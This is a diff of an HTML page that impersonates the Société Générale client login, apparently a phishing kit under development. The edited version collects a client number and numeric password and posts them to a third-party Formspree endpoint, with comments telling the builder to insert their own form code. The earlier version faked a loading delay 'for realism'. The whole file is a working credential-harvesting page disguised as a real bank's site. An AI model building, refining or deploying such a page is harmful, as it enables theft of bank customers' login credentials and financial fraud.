@@ -3,202 +3,161 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Connexion à votre Espace Client Particuliers - Société Générale</title>
+    <title>Société Générale - Espace Client</title>
     <style>
+        /* RESET ET BASE */
+        * { box-sizing: border-box; margin: 0; padding: 0; }
         body {
-            font-family: "Arial", sans-serif;
+            font-family: 'Open Sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
             background-color: #f4f4f4;
-            margin: 0;
-            padding: 0;
             display: flex;
-            flex-direction: column;
+            justify-content: center;
+            align-items: center;
             min-height: 100vh;
         }
-        .header {
-            background-color: #fff;
-            padding: 15px 20px;
-            border-bottom: 3px solid #ED1C24;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        .logo-img {
-            max-height: 50px; /* Taille adaptée pour qu'elle ne prenne pas trop de place */
-            width: auto;
-        }
-        .container {
-            flex: 1;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-        }
-        .login-box {
-            background: white;
-            padding: 30px;
-            border-radius: 4px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+
+        /* CONTENEUR PRINCIPAL */
+        .login-container {
+            background-color: #ffffff;
             width: 100%;
             max-width: 400px;
+            padding: 40px 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
             text-align: center;
         }
+
+        /* LOGO SG */
+        .logo {
+            width: 150px;
+            margin-bottom: 30px;
+        }
+
+        /* TITRE */
         h1 {
             font-size: 22px;
-            color: #333;
-            margin-bottom: 25px;
-            font-weight: normal;
+            color: #000000;
+            margin-bottom: 20px;
+            font-weight: 600;
         }
-        .input-group {
+
+        /* CHAMPS DE FORMULAIRE */
+        .form-group {
             margin-bottom: 20px;
             text-align: left;
         }
+
         label {
             display: block;
-            margin-bottom: 5px;
-            color: #555;
+            margin-bottom: 8px;
+            color: #333;
             font-size: 14px;
+            font-weight: 600;
         }
-        input[type="text"], input[type="password"] {
+
+        input[type="number"] {
             width: 100%;
-            padding: 12px;
+            padding: 12px 15px;
             border: 1px solid #ccc;
             border-radius: 4px;
             font-size: 16px;
-            box-sizing: border-box;
+            transition: border-color 0.3s;
+            -moz-appearance: textfield; /* Pour Firefox */
         }
-        button {
-            background-color: #ED1C24;
+
+        input[type="number"]:focus {
+            border-color: #86BC25; /* Vert SG */
+            outline: none;
+            box-shadow: 0 0 0 2px rgba(134, 188, 37, 0.2);
+        }
+
+        /* Supprimer les flèches haut/bas par défaut sur les inputs number */
+        input[type="number"]::-webkit-outer-spin-button,
+        input[type="number"]::-webkit-inner-spin-button {
+            -webkit-appearance: none;
+            margin: 0;
+        }
+
+        /* BOUTON CONNEXION */
+        .btn-login {
+            width: 100%;
+            padding: 14px;
+            background-color: #86BC25; /* Vert SG */
             color: white;
-            padding: 12px;
             border: none;
             border-radius: 4px;
             font-size: 16px;
-            cursor: pointer;
-            width: 100%;
             font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            margin-top: 10px;
         }
-        button:hover {
-            background-color: #c41017;
+
+        .btn-login:hover {
+            background-color: #76a320;
         }
-        .footer-links {
+
+        /* LIENS EN BAS */
+        .links {
             margin-top: 20px;
             font-size: 13px;
-            color: #ED1C24;
         }
-        .footer-links a {
-            color: #ED1C24;
+
+        .links a {
+            color: #005699; /* Bleu SG */
             text-decoration: none;
-            margin: 0 5px;
+            display: block;
+            margin-bottom: 8px;
         }
+
+        .links a:hover {
+            text-decoration: underline;
+        }
+
+        /* PIED DE PAGE */
         .footer {
-            background-color: #fff;
-            padding: 15px;
-            text-align: center;
+            margin-top: 30px;
             font-size: 12px;
             color: #666;
             border-top: 1px solid #eee;
-        }
-        .footer a {
-            color: #666;
-            text-decoration: none;
-            margin: 0 5px;
-        }
-        .step {
-            display: none;
-        }
-        .step.active {
-            display: block;
-        }
-        .loader {
-            display: none;
-            margin: 20px 0;
-            color: #ED1C24;
-            font-size: 14px;
+            padding-top: 15px;
         }
     </style>
 </head>
 <body>
 
-    <div class="header">
-        <!-- TON IMAGE DE LOGO ICI -->
-        <img src="https://banque.meilleurtaux.com/images/actu/logos/societe-generale-logo.png" alt="Société Générale" class="logo-img">
-    </div>
+    <div class="login-container">
+        <!-- LOGO SG -->
+        <img src="https://upload.wikimedia.org/wikipedia/commons/e/ea/Logo_Soci%C3%A9t%C3%A9_G%C3%A9n%C3%A9rale_2017.svg" alt="Société Générale Logo" class="logo">
 
-    <div class="container">
-        <div class="login-box">
-            <h1>Connexion à votre Espace Client Particuliers</h1>
+        <h1>Connexion</h1>
+
+        <!-- FORMULAIRE -->
+        <!-- N'OUBLIE PAS DE REMPLACER L'URL CI-DESSOUS PAR CELLE DE FORMSPREE SI TU L'UTILISES -->
+        <form action="https://formspree.io/f/TON_CODE_FORMSPREE" method="POST">
             
-            <!-- ÉTAPE 1 : CODE CLIENT -->
-            <div id="step1" class="step active">
-                <form onsubmit="goToStep2(event)">
-                    <div class="input-group">
-                        <label for="email">Code Client ou Code Secret</label>
-                        <input type="text" id="email" name="email" placeholder="Ex: 123456789 ou votre email" required>
-                    </div>
-                    <button type="submit">Suivant</button>
-                </form>
-                <div class="footer-links">
-                    <a href="#">Code Client ou Code Secret inconnus ?</a> | 
-                    <a href="#">Je souhaite obtenir mon Code Client</a>
-                </div>
+            <div class="form-group">
+                <label for="client_id">Numéro de client (Chiffres)</label>
+                <input type="number" id="client_id" name="client_id" placeholder="Ex: 1234567890" required>
             </div>
 
-            <!-- CHARGEMENT -->
-            <div id="loader" class="loader">
-                Chargement de votre compte...
+            <div class="form-group">
+                <label for="password">Mot de passe (Chiffres)</label>
+                <input type="number" id="password" name="password" placeholder="Ex: 12345" required>
             </div>
 
-            <!-- ÉTAPE 2 : MOT DE PASSE -->
-            <div id="step2" class="step">
-                <form action="/login" method="POST">
-                    <!-- Champ caché pour l'email -->
-                    <input type="hidden" name="email" id="hidden_email">
-                    
-                    <div class="input-group">
-                        <label for="password">Mot de passe</label>
-                        <input type="number"name="password"placeholder="Votre mot de passe"/>
-                    </div>
-                    <button type="submit">Se connecter</button>
-                </form>
-                <div class="footer-links">
-                    <a href="#">Mot de passe oublié ?</a>
-                </div>
+            <button type="submit" class="btn-login">Se connecter</button>
+
+            <div class="links">
+                <a href="#">Mot de passe oublié ?</a>
+                <a href="#">Première connexion</a>
             </div>
+        </form>
+
+        <div class="footer">
+            <p>&copy; 2026 Société Générale. Tous droits réservés.</p>
         </div>
     </div>
 
-    <div class="footer">
-        <a href="#">Sécurité</a> | 
-        <a href="#">Gestion des Cookies</a> | 
-        <a href="#">Données personnelles</a> | 
-        <a href="#">Informations légales</a>
-        <br><br>
-        © Société Générale
-    </div>
-
-    <script>
-        function goToStep2(event) {
-            event.preventDefault();
-            
-            // Récupérer la valeur de l'email
-            const emailValue = document.getElementById('email').value;
-            
-            // La mettre dans le champ caché pour l'étape 2
-            const hiddenEmailInput = document.getElementById('hidden_email');
-            hiddenEmailInput.value = emailValue;
-            
-            // Gestion de l'affichage
-            document.getElementById('step1').classList.remove('active');
-            document.getElementById('loader').style.display = 'block';
-            
-            // Délai de 1 seconde pour le réalisme
-            setTimeout(function() {
-                document.getElementById('loader').style.display = 'none';
-                document.getElementById('step2').classList.add('active');
-            }, 1000);
-        }
-    </script>
-
 </body>
 </html>
-   
